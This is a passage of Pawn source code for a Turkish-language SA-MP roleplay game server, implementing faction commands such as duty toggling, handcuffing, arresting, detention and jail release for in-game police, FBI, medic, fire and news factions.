	    else if(Birlik[Karakter[playerid][birlik]][ftip] == FBI && IsPlayerInRangeOfPoint(playerid, 5.0, 277.9633,-1526.3859,24.9299) && GetPlayerVirtualWorld(playerid) == 22 && GetPlayerInterior(playerid) == 1)
	    {
	        string = "";
	        for(new x;x<5;x++)
	        {
	            if(MySQLCheckAksesuar(Karakter[playerid][sqlid],x) != 0) format(string, sizeof(string), "%s%d (DOLU)\n", string, x);
	            else format(string, sizeof(string), "%s%d\n", string, x);
	        }
        	ShowPlayerDialog(playerid, 146, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Aksesuar Sistemi", string, "Seç", "Ýptal");
        	pdaksesuarda[playerid] = 1;
	    }
	    return 1;
	}
	if(!strcmp(string, "/birlikaksesuar", true))
	{
		foreach(new i : Business)
        {
			if(Isyeri[i][itip] == 6)
			{
		   		if(PlayerToPoint(20.0, playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
		   		{
			   		if(Birlik[Karakter[playerid][birlik]][ftip] == MC)
			   		{
			   			string = "";
			   			for(new x;x<5;x++)
			   			{
			   				if(MySQLCheckAksesuar(Karakter[playerid][sqlid],x) != 0) format(string, sizeof(string), "%s%d (DOLU)\n", string, x);
			   				else format(string, sizeof(string), "%s%d\n", string, x);
			   			}
						ShowPlayerDialog(playerid, 9991, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Aksesuar Sistemi", string, "Seç", "Ýptal");
						mcaksesuarda[playerid] = 1;
	 				}
				}
			}
		}
 		return 1;
	}
	if(!strcmp(string, "/basinkarti", true))
	{
		if(Birlik[Karakter[playerid][birlik]][ftip] == SANTV)
	    {
			if(Karakter[playerid][sisbasi] == 0)
	 		{
		  		new targetrank[32];
		  		switch(Karakter[playerid][rutbe])
				{
					case 0: targetrank = "Sivil";
					case 1: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe1]);
					case 2: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe2]);
					case 3: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe3]);
					case 4: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe4]);
				 	case 5: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe5]);
				 	case 6: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe6]);
					case 7: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe7]);
					case 8: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe8]);
					case 9: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe9]);
					case 10: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe10]);
					case 11: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe11]);
					case 12: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe12]);
					case 13: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe13]);
					case 14: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe14]);
					case 15: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe15]);
					case 16: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe16]);
					case 17: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe17]);
					case 18: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe18]);
					case 19: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe19]);
					case 20: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe20]);
				}
				format(targetrank, 32, "[%s]", targetrank);
				if(Karakter[playerid][rutbe] <= 20) UpdateDynamic3DTextLabelText(gRutbeIsim[playerid], COLOR_SANTV, targetrank);
				OnPlayerCommandPerformed(playerid,"/me basýn kartýný çýkartarak boynuna asar.",0);
			    SetPlayerColor(playerid, COLOR_SANTV);
			    new string2[34];
				format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
				UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string2);
				Karakter[playerid][sisbasi] = 1;
				GivePlayerWeapon(playerid, 43, 100);
			}
			else
			{
		  		UpdateDynamic3DTextLabelText(gRutbeIsim[playerid], COLOR_SANTV, "");
				OnPlayerCommandPerformed(playerid,"/me basýn kartýný boynundan çýkartýr.",0);
				SetPlayerColor(playerid, COLOR_WHITE);
				ResetPlayerWeapons(playerid);
			    Karakter[playerid][sisbasi] = 0;
				new string2[34];
				format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
				UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string2);
			}
		}
	    return 1;
	}
	if(strcmp(string, "/isbasi", true) == 0)
	{
	    if(Birlik[Karakter[playerid][birlik]][ftip] == FBI || Birlik[Karakter[playerid][birlik]][ftip] == SANTV || Birlik[Karakter[playerid][birlik]][ftip] == LSPD || Birlik[Karakter[playerid][birlik]][ftip] == LSPA || Birlik[Karakter[playerid][birlik]][ftip] == ASMS || Birlik[Karakter[playerid][birlik]][ftip] == LSFD)
	    {
	        new _bid = Karakter[playerid][birlik];
	        switch(Birlik[Karakter[playerid][birlik]][ftip])
	        {
	            case FBI:
	            {
	                if(IsPlayerInRangeOfPoint(playerid, 5.0, 1150.5441,360.8029,1002.1450) && GetPlayerVirtualWorld(playerid) == 434 && GetPlayerInterior(playerid) == 1)
	                {
                     	if(!Karakter[playerid][fbiisbasi])
			            {
                      		//SetPlayerColor(playerid, 0x8D8DFFFF);
                      		SetPlayerColor(playerid, COLOR_WHITE);
	                    	Karakter[playerid][fbiisbasi] = 1;
	                    	Bilgi(playerid, "Ýþbaþý oldunuz.");
	                    	GivePlayerWeapon(playerid, 24, 100);
	                    	SetPlayerAmmo(playerid, WEAPON_DEAGLE, 100);
						}
						else
						{
						    SetPlayerColor(playerid, COLOR_WHITE);
						    Karakter[playerid][fbiisbasi] = 0;
						    Bilgi(playerid, "Ýþbaþýndan çýktýnýz.");
						    GivePlayerWeapon(playerid, 24, 100);
						    SetPlayerAmmo(playerid, WEAPON_DEAGLE, 100);
						}
	                }
	            }
	            case LSPD:
	            {
	                if(IsPlayerInRangeOfPoint(playerid, 5.0, Birlik[_bid][bisbasix], Birlik[_bid][bisbasiy], Birlik[_bid][bisbasiz]) && GetPlayerVirtualWorld(playerid) == Birlik[_bid][bisbasivw] && GetPlayerInterior(playerid) == Birlik[_bid][bisbasiint])
			        {
			            if(!Karakter[playerid][isbasi])
			            {
			                Karakter[playerid][skin] = GetPlayerSkinEx(playerid);
							//if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 1) { SetPlayerHealth(playerid, 100); SetPlayerArmour(playerid, 20); Karakter[playerid][isbasiskin] = 307; SetPlayerColor(playerid, 0x8D8DFFFF); SetPlayerSkin(playerid, 307); Karakter[playerid][isbasi] = 1;}
							//else if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] ==  2) { SetPlayerHealth(playerid, 100); SetPlayerArmour(playerid, 20); Karakter[playerid][isbasiskin] = 306; SetPlayerSkin(playerid, 306); SetPlayerColor(playerid, 0x8D8DFFFF); Karakter[playerid][isbasi] = 1;}
							//else if(Karakter[playerid][cinsiyet] == 1) ShowPlayerDialog(playerid, 91, DIALOG_STYLE_LIST, "Üniforma Listesi", "Üniforma 1 ((265))\nÜniforma 2 ((266))\nÜniforma 3 ((267))\nÜniforma 4 ((280))\nÜniforma 5 ((281))\nÜniforma 6 ((284))\nÜniforma 7 ((300))\nÜniforma 8 ((301))\nÜniforma 9 ((306))\nÜniforma 10 ((307))\n Dedektif", "Onayla", "Kapat");
							if(Karakter[playerid][cinsiyet] == 2) ShowModelSelectionMenu(playerid, pdkiyafetkadin, "Kiyafet Secimi");
							else if(Karakter[playerid][cinsiyet] == 1) ShowModelSelectionMenu(playerid, pdkiyafeterkek, "Kiyafet Secimi");
      						new targetrank[32];
							switch(Karakter[playerid][rutbe])
							{
						 		case 0: targetrank = "Sivil";
								case 1: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe1]);
								case 2: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe2]);
						  		case 3: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe3]);
						    	case 4: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe4]);
							    case 5: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe5]);
							    case 6: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe6]);
								case 7: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe7]);
								case 8: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe8]);
								case 9: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe9]);
								case 10: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe10]);
								case 11: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe11]);
								case 12: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe12]), gDedektif[playerid] = 1;
								case 13: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe13]), gDedektif[playerid] = 1;
								case 14: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe14]), gDedektif[playerid] = 1;
								case 15: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe15]), gDedektif[playerid] = 1;
								case 16: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe16]);
								case 17: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe17]);
								case 18: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe18]);
								case 19: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe19]);
								case 20: format(targetrank, sizeof(targetrank), Birlik[Karakter[playerid][birlik]][rutbe20]);
							}
							format(targetrank, 32, "[%s]", targetrank);
							if(Karakter[playerid][rutbe] <= 20) UpdateDynamic3DTextLabelText(gRutbeIsim[playerid], 0x8D8DFFFF, targetrank);
						}
						else
						{
          					UpdateDynamic3DTextLabelText(gRutbeIsim[playerid], 0x8D8DFFFF, "");
						    SetPlayerColor(playerid, COLOR_WHITE);
						    new string2[34];
							format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
							UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string2);
						    SetPlayerArmour(playerid, 0);
						    SetPlayerHealth(playerid, 100);
						    ResetPlayerWeapons(playerid);
						    SetPlayerSkin(playerid, Karakter[playerid][skin]);
						    Karakter[playerid][isbasi] = 0;
						    foreach(new i : Player)
							{
								RemovePlayerMapIcon(i, playerid);
							}
						    if(Karakter[playerid][rutbe] <= 14)
							{
								GivePlayerWeapon(playerid, 24, 100);
							}
							else if(Karakter[playerid][rutbe] == 15 || Karakter[playerid][rutbe] == 16 || Karakter[playerid][rutbe] == 17)
							{
								GivePlayerWeapon(playerid, 22, 50);
							}
						}
					}
	            }
	            case ASMS:
	            {
	                if(IsPlayerInRangeOfPoint(playerid, 5.0, Birlik[_bid][bisbasix], Birlik[_bid][bisbasiy], Birlik[_bid][bisbasiz]) && GetPlayerVirtualWorld(playerid) == Birlik[_bid][bisbasivw] && GetPlayerInterior(playerid) == Birlik[_bid][bisbasiint])
			        {
			            if(!Karakter[playerid][medisbasi])
				        {
				            Karakter[playerid][skin] = GetPlayerSkinEx(playerid);
				            if(Karakter[playerid][cinsiyet] == 2) ShowModelSelectionMenu(playerid, mdkiyafetkadin, "Kiyafet Secimi");
							else if(Karakter[playerid][cinsiyet] == 1) ShowModelSelectionMenu(playerid, mdkiyafeterkek, "Kiyafet Secimi");
						}
						else
						{
						    Karakter[playerid][medisbasi] = 0;
							SetPlayerColor(playerid, COLOR_WHITE);
							SetPlayerSkin(playerid, Karakter[playerid][skin]);
							new string2[34];
                            UpdateDynamic3DTextLabelText(gRutbeIsim[playerid], 0x8D8DFFFF, "");
							format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
							UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string2);
						}
                    }
	            }
	            case LSFD:
	            {
	                if(IsPlayerInRangeOfPoint(playerid, 5.0, Birlik[_bid][bisbasix], Birlik[_bid][bisbasiy], Birlik[_bid][bisbasiz]) && GetPlayerVirtualWorld(playerid) == Birlik[_bid][bisbasivw] && GetPlayerInterior(playerid) == Birlik[_bid][bisbasiint])
			        {
			            if(!Karakter[playerid][fdisbasi])
				        {
				            Karakter[playerid][skin] = GetPlayerSkinEx(playerid);
				            if(Karakter[playerid][cinsiyet] == 2) ShowModelSelectionMenu(playerid, fdkiyafetkadin, "Kiyafet Secimi");
							else if(Karakter[playerid][cinsiyet] == 1) ShowModelSelectionMenu(playerid, fdkiyafeterkek, "Kiyafet Secimi");
						}
						else
						{
						    UpdateDynamic3DTextLabelText(gRutbeIsim[playerid], COLOR_LSFD, "");
						    Karakter[playerid][fdisbasi] = 0;
							SetPlayerColor(playerid, COLOR_WHITE);
							SetPlayerSkin(playerid, Karakter[playerid][skin]);
							new string2[34];
							format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
							UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string2);
						}
                    }
	            }
	            case SANTV:
				{
			        if(IsPlayerInRangeOfPoint(playerid, 5.0, Birlik[_bid][bisbasix], Birlik[_bid][bisbasiy], Birlik[_bid][bisbasiz]) && GetPlayerVirtualWorld(playerid) == Birlik[_bid][bisbasivw] && GetPlayerInterior(playerid) == Birlik[_bid][bisbasiint])
			        {
			            if(!Karakter[playerid][sisbasi])
			            {
			                SetPlayerColor(playerid, COLOR_SANTV);
							Bilgi(playerid, "Ýþbaþý oldunuz.");
		                    new string2[34];
							format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
							UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string2);
							Karakter[playerid][sisbasi] = 1;
							GivePlayerWeapon(playerid, 43, 100);
						}
						else
						{
							SetPlayerColor(playerid, COLOR_WHITE);
							ResetPlayerWeapons(playerid);
						    Karakter[playerid][sisbasi] = 0;
						    Bilgi(playerid, "Ýþbaþýndan çýktýnýz.");
			    			new string2[34];
							format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
							UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string2);
						}
					}
				}
				case LSPA:
				{
				    if(IsPlayerInRangeOfPoint(playerid, 5.0, Birlik[_bid][bisbasix], Birlik[_bid][bisbasiy], Birlik[_bid][bisbasiz]) && GetPlayerVirtualWorld(playerid) == Birlik[_bid][bisbasivw] && GetPlayerInterior(playerid) == Birlik[_bid][bisbasiint])
			        {
    					if(!Karakter[playerid][isbasi])
			            {
			                Karakter[playerid][skin] = GetPlayerSkinEx(playerid);
							if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 1) { SetPlayerHealth(playerid, 100); SetPlayerArmour(playerid, 100); Karakter[playerid][isbasiskin] = 307; SetPlayerColor(playerid, 0x8D8DFFFF); SetPlayerSkin(playerid, 307); Karakter[playerid][isbasi] = 1;}
							else if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] ==  2) { SetPlayerHealth(playerid, 100); SetPlayerArmour(playerid, 100); Karakter[playerid][isbasiskin] = 306; SetPlayerSkin(playerid, 306); SetPlayerColor(playerid, 0x8D8DFFFF); Karakter[playerid][isbasi] = 1;}
							else if(Karakter[playerid][cinsiyet] == 1) ShowPlayerDialog(playerid, 91, DIALOG_STYLE_LIST, "Üniforma Listesi", "Üniforma 1 ((265))\nÜniforma 2 ((266))\nÜniforma 3 ((267))\nÜniforma 4 ((280))\nÜniforma 5 ((281))\nÜniforma 6 ((284))\nÜniforma 7 ((300))\nÜniforma 8 ((301))\nÜniforma 9 ((306))\nÜniforma 10 ((307))", "Onayla", "Kapat");
						}
						else
						{
						    SetPlayerColor(playerid, COLOR_WHITE);
						    new string2[34];
							format(string2, sizeof(string2), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
							UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string2);
						    SetPlayerArmour(playerid, 0);
						    SetPlayerHealth(playerid, 100);
						    ResetPlayerWeapons(playerid);
						    SetPlayerSkin(playerid, Karakter[playerid][skin]);
						    Karakter[playerid][isbasi] = 0;
						}
					}
				}
			}
		}
		return 1;
	}
	if(strcmp(string, "/kelepce", true) == 0)
	{
		string = strtok(cmdtext, idx);
  		new emm[128];
		if(Birlik[Karakter[playerid][birlik]][ftip] == LSPA || (Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi] == 1) || Birlik[Karakter[playerid][birlik]][ftip] == FBI)
		{
		    if((Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi] == 0) || (Birlik[Karakter[playerid][birlik]][ftip] == FBI && Karakter[playerid][fbiisbasi] == 0)) return Hata(playerid, "Ýþbaþý deðilsiniz.");
			if(!strlen(string))
			{
			    Kullanim(playerid, "/kelepce [oyuncuID]");
			    return 1;
			}
			/*if(strval(string) == playerid)
			{
			    Hata(playerid, "Kendinizi kelepçeleyemezsiniz.");
			    return 1;
			}*/
			if(ProxDetectorS(3.5, playerid, strval(string)))
			{
			    if(!Kelepceli[strval(string)])
			    {
			        SetPlayerCuffed(strval(string), true);
					Kelepceli[strval(string)] = 1;
					format(emm, sizeof(emm), "/me %s adlý kiþiyi kelepçeler.", OyuncuAdiniBul(strval(string)));
					OnPlayerCommandPerformed(playerid,emm,0);
				}
				else
				{
					format(emm, sizeof(emm), "/me %s adlý kiþinin kelepçelerini çözer.", OyuncuAdiniBul(strval(string)));
					OnPlayerCommandPerformed(playerid,emm,0);
	                Kelepceli[strval(string)] = 0;
			        SetPlayerCuffed(strval(string), false);
				}
			}
			else
			{
			    Hata(playerid, "Oyuncu yakýnýnýzda deðil.");
			}
		}
		return 1;
	}

    if(!strcmp(string, "/arackaldir", true))
	{
	    if(Birlik[Karakter[playerid][birlik]][ftip] == MODIFIYE)
		{
		    if(!IsPlayerInAnyVehicle(playerid))
		    {
 				new tmp[128];
		    	tmp = strtok(cmdtext, idx);
		    	if(!strlen(tmp)) return Ipucu(playerid, "/arackaldir (yukari/asagi)");
			 	if (!isnull(tmp) && !strcmp(tmp, "yukari", true))
			    {
			        if(!IsPlayerInRangeOfPoint(playerid, 5.0, 1569.34424, -2156.86060, 12.96720)) return Hata(playerid, "Araç kaldýrma yerinde deðilsiniz!");
			        MoveDynamicObject(MechLift, 1569.34424, -2156.86060, 14.70720, 0.5);
			    }
			    else if (!isnull(tmp) && !strcmp(tmp, "asagi", true))
			    {
			        if(!IsPlayerInRangeOfPoint(playerid, 5.0, 1569.34424, -2156.86060, 12.96720)) return Hata(playerid, "Araç kaldýrma yerinde deðilsiniz!");
			        MoveDynamicObject(MechLift, 1569.34424, -2156.86060, 12.96720, 0.5);
			    }
		    }
		    else
		    {
		        Hata(playerid, "Araçtan inmelisin.");
		    }
		}
		return 1;
	}
	if(!strcmp(string, "/tutukla", true))
	{
	    if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD)
	    {
	        if(IsPlayerInRangeOfPoint(playerid, 30.0, Veriler[tiX], Veriler[tiY], Veriler[tiZ]))
	        {
		        string = strtok(cmdtext, idx);
		        if(!strlen(string))
		        {
		            Kullanim(playerid, "/tutukla [oyuncuID] [süre(dk)] [sebep]");
					Ipucu(playerid, "Sabýka kaydýnýn düzgün olarak iþlemesi için Türkçe karakter kullanmayýn.");
		            return 1;
				}
				new id = strval(string);
		        string = strtok(cmdtext, idx);
		        if(!strlen(string))
		        {
		            Kullanim(playerid, "/tutukla [oyuncuID] [süre(dk)] [sebep]");
					Ipucu(playerid, "Sabýka kaydýnýn düzgün olarak iþlemesi için Türkçe karakter kullanmayýn.");
		            return 1;
				}
				new dakika = strval(string);
				new length = strlen(cmdtext);
				while ((idx < length) && (cmdtext[idx] <= ' '))
				{
					idx++;
				}
				new offset = idx;
				new result[64], mstring[256];
				while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
				{
					result[idx - offset] = cmdtext[idx];
					idx++;
				}
				result[idx - offset] = EOS;
				if(!strlen(result))
				{
		            Kullanim(playerid, "/tutukla [oyuncuID] [süre(dk)] [sebep]");
					Ipucu(playerid, "Sabýka kaydýnýn düzgün olarak iþlemesi için Türkçe karakter kullanmayýn.");
					return 1;
				}
				if(playerid == id) return Hata(playerid, "Kendi kendinizi tutuklayamazsýnýz.");
				if(ProxDetectorS(5.0, playerid, id))
				{
				    if(dakika >= 1)
				    {
					        Karakter[id][kodes] = dakika;
					        SetPlayerPos(id, Veriler[tX], Veriler[tY], Veriler[tZ]);
					        SetPlayerInterior(id, Veriler[tint]);
					        SetPlayerVirtualWorld(id, Veriler[tvw]);
					        DONDUR(id);
					        UnfreezeTimerVar[id] = SetTimerEx("UnfreezeTimer", 3500, false, "u", id);
							new Year, Month, Day, date[128];
						    getdate(Year,Month,Day);
						    format(date,sizeof(date),"%02d/%02d/%d",Day,Month,Year);
						    new mysqlkaydet[512];
							mysql_format(1,mysqlkaydet, sizeof(mysqlkaydet), "INSERT INTO `sabikaydi` (`isim`,`suc`,`tarih`,`tutuklayan`) VALUES ('%e','%e','%e','%e')",OyuncuAdiniBul(id),result,date,OyuncuAdiniBul(playerid));
	      					mysql_tquery(1, mysqlkaydet);
	      					Karakter[id][temizrapor] = -1;
	      					Karakter[id][sruhsat2] = 0;
	      					Karakter[id][sruhsat] = 0;
							format(string, sizeof(string), "%s adlý oyuncuyu %d dakika hapise attýnýz.", OyuncuAdiniBul(id), dakika);
							Bilgi(playerid, string);
							format(string, sizeof(string), "%s adlý oyuncu tarafýndan %d(%s) dakika hapise atýldýnýz.", OyuncuAdiniBul(playerid), dakika, result);
							Bilgi(id, string);
							format(mstring, sizeof(mstring), "%s adlý kiþi %s adlý polis memuru tarafýndan tutuklandý. Sebep: %s - %d dakika.", OyuncuAdiniBul(id), OyuncuAdiniBul(playerid), result, dakika);
							for(new i=0;i<MAX_PLAYERS;i++){
								if(Birlik[Karakter[i][birlik]][ftip] == LSPD && Girdi[i]){
									MesajGonder(i,0xffff00FF,mstring);
								}
							}
					}
				}
			}
		}
		else if(Birlik[Karakter[playerid][birlik]][ftip] == FBI)
	    {
	        if(IsPlayerInRangeOfPoint(playerid, 30.0, 1361.1404,538.2576,1067.7399) && GetPlayerVirtualWorld(playerid) == 404 && GetPlayerInterior(playerid) == 1)
	        {
		        string = strtok(cmdtext, idx);
		        if(!strlen(string))
		        {
		            Kullanim(playerid, "/tutukla [oyuncuID] [süre(dk)] [sebep]");
					Ipucu(playerid, "Sabýka kaydýnýn düzgün olarak iþlemesi için Türkçe karakter kullanmayýn.");
		            return 1;
				}
				new id = strval(string);
		        string = strtok(cmdtext, idx);
		        if(!strlen(string))
		        {
		            Kullanim(playerid, "/tutukla [oyuncuID] [süre(dk)] [sebep]");
					Ipucu(playerid, "Sabýka kaydýnýn düzgün olarak iþlemesi için Türkçe karakter kullanmayýn.");
		            return 1;
				}
				new dakika = strval(string);
				new length = strlen(cmdtext);
				while ((idx < length) && (cmdtext[idx] <= ' '))
				{
					idx++;
				}
				new offset = idx;
				new result[64];
				while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
				{
					result[idx - offset] = cmdtext[idx];
					idx++;
				}
				result[idx - offset] = EOS;
				if(!strlen(result))
				{
		            Kullanim(playerid, "/tutukla [oyuncuID] [süre(dk)] [sebep]");
					Ipucu(playerid, "Sabýka kaydýnýn düzgün olarak iþlemesi için Türkçe karakter kullanmayýn.");
					return 1;
				}
				if(ProxDetectorS(5.0, playerid, id))
				{
				    if(dakika >= 1)
				    {
				        Karakter[id][kodes] = dakika;
				        SetPlayerPos(id, Veriler[tX], Veriler[tY], Veriler[tZ]);
				        SetPlayerInterior(id, Veriler[tint]);
				        SetPlayerVirtualWorld(id, Veriler[tvw]);
						new Year, Month, Day, date[128],timestamp;
					    getdate(Year,Month,Day);
						timestamp=gettime();
					    format(date,sizeof(date),"%02d/%02d/%d",Day,Month,Year);
					    new mysqlkaydet[512];
						mysql_format(1,mysqlkaydet, sizeof(mysqlkaydet), "INSERT INTO `sabikaydi` (`sucluid`,`isim`,`suc`,`tarih`,`timestamp`,`tutuklayan`,`tutukid`) VALUES ('%d','%e','%e','%e','%e')",Karakter[id][sqlid],OyuncuAdiniBul(id),result,date,timestamp,OyuncuAdiniBul(playerid),Karakter[playerid][sqlid]);
      					mysql_tquery(1, mysqlkaydet);
      					Karakter[id][temizrapor] = -1;
      					Karakter[id][sruhsat2] = 0;
      					Karakter[id][sruhsat] = 0;
						format(string, sizeof(string), "%s adlý oyuncuyu %d dakika hapise attýnýz.", OyuncuAdiniBul(id), dakika);
						Bilgi(playerid, string);
						format(string, sizeof(string), "%s adlý oyuncu tarafýndan %d(%s) dakika hapise atýldýnýz.", OyuncuAdiniBul(playerid), dakika, result);
						Bilgi(id, string);
						format(string, sizeof(string), "%s adlý kiþi F.B.I tarafýndan tutuklandý. Sebep: %s - %d dakika.", OyuncuAdiniBul(id), result, dakika);
						SendClientMessageToAll(COLOR_LIGHTRED, string);
					}
				}
			}
		}
		return 1;
	}
	if(!strcmp(string, "/gozalti", true))
	{
	    if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD)
	    {
	        if(IsPlayerInRangeOfPoint(playerid, 30.0, Veriler[tiX], Veriler[tiY], Veriler[tiZ]))
	        {
		        string = strtok(cmdtext, idx);
		        if(!strlen(string))
		        {
		            Kullanim(playerid, "/gozalti [oyuncuID] [süre(dk)] [sebep]");
					Ipucu(playerid, "Sabýka kaydýnýn düzgün olarak iþlemesi için Türkçe karakter kullanmayýn.");
		            return 1;
				}
				new id = strval(string);
		        string = strtok(cmdtext, idx);
		        if(!strlen(string))
		        {
		            Kullanim(playerid, "/gozalti [oyuncuID] [süre(dk)] [sebep]");
					Ipucu(playerid, "Sabýka kaydýnýn düzgün olarak iþlemesi için Türkçe karakter kullanmayýn.");
		            return 1;
				}
				new dakika = strval(string);
				new length = strlen(cmdtext);
				while ((idx < length) && (cmdtext[idx] <= ' '))
				{
					idx++;
				}
				new offset = idx;
				new result[64];
				while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
				{
					result[idx - offset] = cmdtext[idx];
					idx++;
				}
				result[idx - offset] = EOS;
				if(!strlen(result))
				{
		            Kullanim(playerid, "/gozalti [oyuncuID] [süre(dk)] [sebep]");
					Ipucu(playerid, "Sabýka kaydýnýn düzgün olarak iþlemesi için Türkçe karakter kullanmayýn.");
					return 1;
				}
				if(playerid == id) return Hata(playerid, "Kendi kendinizi gözaltýna atamazsýnýz.");
				if(ProxDetectorS(5.0, playerid, id))
				{
				    if(dakika >= 1)
				    {
				        Karakter[id][kodes] = dakika;
				        SetPlayerPos(id, -712.9499,-2965.7100,1197.7346);
						new Year, Month, Day, date[128];
					    getdate(Year,Month,Day);
					    format(date,sizeof(date),"%02d/%02d/%d",Day,Month,Year);
						format(string, sizeof(string), "%s adlý oyuncuyu %d dakika gözaltýna attýnýz.", OyuncuAdiniBul(id), dakika);
						Bilgi(playerid, string);
						format(string, sizeof(string), "%s adlý oyuncu tarafýndan %d(%s) dakika gözaltýna atýldýnýz.", OyuncuAdiniBul(playerid), dakika, result);
						Bilgi(id, string);
						format(string, sizeof(string), "{ffff00}%s adlý kiþi %s adlý polis memuru tarafýndan gözaltýna atýldý. Sebep: %s - %d dakika.", OyuncuAdiniBul(id), OyuncuAdiniBul(playerid), result, dakika);
						for(new i=0;i<MAX_PLAYERS;i++){
						if(Birlik[Karakter[i][birlik]][ftip] == LSPD && Girdi[i]){
						MesajGonder(i,0xffff00FF,string);
						}
						}
					}
				}
			}
		}
		return 1;
	}
 	if(!strcmp(string, "/hapiscikar", true))
	{
	    if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD)
	    {
         if(IsPlayerInRangeOfPoint(playerid, 30.0, Veriler[tiX], Veriler[tiY], Veriler[tiZ]))
	        {
		        string = strtok(cmdtext, idx);
		        if(!strlen(string))
		        {
		            Kullanim(playerid, "/hapiscikar [oyuncuID]");
		            return 1;
				}
				new id = strval(string);
				if(ProxDetectorS(5.0, playerid, id))
				{
			        Karakter[id][kodes] = 0;
			        SetPlayerPos(id, -713.1651,-2961.7671,1197.7346);
					format(string, sizeof(string), "%s adlý oyuncuyu hapisten çýkardýnýz.", OyuncuAdiniBul(id));
					Bilgi(playerid, string);
					format(string, sizeof(string), "%s adlý oyuncu tarafýndan hapisten çýkartýldýnýz.", OyuncuAdiniBul(playerid));
					Bilgi(id, string);
				}
			}
		}
		if(Birlik[Karakter[playerid][birlik]][ftip] == FBI)
	    {
	        if(IsPlayerInRangeOfPoint(playerid, 30.0, 1361.1404,538.2576,1067.7399) && GetPlayerVirtualWorld(playerid) == 404 && GetPlayerInterior(playerid) == 1)
	        {
		        string = strtok(cmdtext, idx);
		        if(!strlen(string))
		        {
